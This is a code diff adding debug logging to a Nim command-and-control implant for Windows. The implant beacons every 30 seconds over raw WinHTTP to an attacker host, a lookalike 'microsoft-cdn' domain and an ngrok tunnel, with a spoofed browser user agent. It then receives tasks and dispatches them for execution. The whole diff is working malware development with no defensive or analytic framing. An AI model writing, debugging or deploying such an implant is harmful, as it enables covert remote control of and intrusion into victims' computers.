@@ -6,6 +6,10 @@
 import winim
 import winim/inc/winhttp
 
+template dbg(msg: string) =
+  stdout.writeLine("[c2] " & msg)
+  stdout.flushFile()
+
 const
   SLEEP_MS*:      uint32 = 30_000'u32
   C2_HOST*:       string = "update.microsoft-cdn.net"
@@ -49,6 +53,7 @@ proc buildBeacon(): seq[byte] =
 
 proc winhttpRequest(body: seq[byte]): seq[byte] =
   # unsafe — raw WinHTTP calls
+  dbg("beacon to " & NGROK_HOST & ":" & $C2_PORT & C2_BEACON_PATH)
   var ua      = toWide("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
   var hostW   = toWide(NGROK_HOST)
   var pathW   = toWide(C2_BEACON_PATH)
@@ -59,7 +64,10 @@ proc winhttpRequest(body: seq[byte]): seq[byte] =
     cast[LPCWSTR](addr ua[0]),
     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
     nil, nil, 0)
-  if session == nil: return @[]
+  if session == nil:
+    dbg("FAIL: WinHttpOpen returned nil")
+    return @[]
+  dbg("WinHttpOpen OK")
 
   var timeout: DWORD = DWORD(TIMEOUT)
   discard WinHttpSetOption(session, WINHTTP_OPTION_CONNECT_TIMEOUT,
@@ -68,8 +76,10 @@ proc winhttpRequest(body: seq[byte]): seq[byte] =
   let conn = WinHttpConnect(session, cast[LPCWSTR](addr hostW[0]),
                             C2_PORT, 0)
   if conn == nil:
+    dbg("FAIL: WinHttpConnect returned nil (host=" & NGROK_HOST & " port=" & $C2_PORT & ")")
     discard WinHttpCloseHandle(session)
     return @[]
+  dbg("WinHttpConnect OK")
 
   let req = WinHttpOpenRequest(
     conn,
@@ -80,9 +90,11 @@ proc winhttpRequest(body: seq[byte]): seq[byte] =
     nil,
     WINHTTP_FLAG_SECURE)
   if req == nil:
+    dbg("FAIL: WinHttpOpenRequest returned nil")
     discard WinHttpCloseHandle(conn)
     discard WinHttpCloseHandle(session)
     return @[]
+  dbg("WinHttpOpenRequest OK")
 
   var ct    = toWide("Content-Type: application/json\r\n")
   let bptr  = if body.len > 0: cast[LPVOID](unsafeAddr body[0]) else: nil
@@ -95,10 +107,12 @@ proc winhttpRequest(body: seq[byte]): seq[byte] =
     DWORD(body.len),
     0)
   if ok == 0:
+    dbg("FAIL: WinHttpSendRequest failed (err=" & $GetLastError() & ")")
     discard WinHttpCloseHandle(req)
     discard WinHttpCloseHandle(conn)
     discard WinHttpCloseHandle(session)
     return @[]
+  dbg("WinHttpSendRequest OK")
 
   discard WinHttpReceiveResponse(req, nil)
 
@@ -111,6 +125,7 @@ proc winhttpRequest(body: seq[byte]): seq[byte] =
     addr status,
     addr statusSz,
     nil)
+  dbg("HTTP response status: " & $int(status))
 
   var response: seq[byte]
   var buf: array[4096, byte]
@@ -133,9 +148,16 @@ proc dispatchTask(task: seq[byte]) =
 # Fix: renamed from `run()` (no params) to `beaconLoop(key)` to match call site in main.
 proc beaconLoop*(key: array[16, byte]) {.noReturn.} =
   while true:
+    dbg("--- beacon cycle ---")
     let beacon = buildBeacon()
     if beacon.len > 0:
       let task = winhttpRequest(beacon)
       if task.len > 0:
         dispatchTask(task)
+        dbg("task response: " & $task.len & " bytes")
+      else:
+        dbg("no task / empty response")
+    else:
+      dbg("FAIL: buildBeacon returned empty")
+    dbg("sleeping " & $SLEEP_MS & "ms...")
     Sleep(DWORD(SLEEP_MS))
